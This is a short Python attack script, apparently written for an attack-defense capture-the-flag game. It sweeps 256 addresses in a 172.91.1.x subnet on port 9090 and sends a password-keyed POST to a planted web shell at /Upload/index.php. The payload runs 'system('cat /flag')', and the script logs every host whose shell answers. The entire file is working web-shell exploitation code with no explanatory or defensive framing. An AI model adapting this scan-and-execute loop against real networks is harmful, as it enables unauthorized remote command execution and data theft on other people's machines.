import requests
url="http://172.91.1."
url1=""
shell="/Upload/index.php"
passwd="safahsfas"
port="9090"
payload={passwd:'system(\'cat /flag\');'}
f=open("webshelllist.txt","w")
f1=open("firstrout_flag.txt","w")
for i in range(256):
    url1=url+str(i)+":"+port+shell
    try:
        res=requests.post(url1,payload,timeout=1)
        if res.status_code==requests.codes.ok:
            print(url1+"connect shell sucess,flag is "+res.text)
            print >>f1,url1+"connect shell sucess,flag is "+res.text
            print >>f,url1+","+passwd
        else:
            print("shell 404")
    except:
        print (url1+"connect shell fail")
f1.close()
f.close()
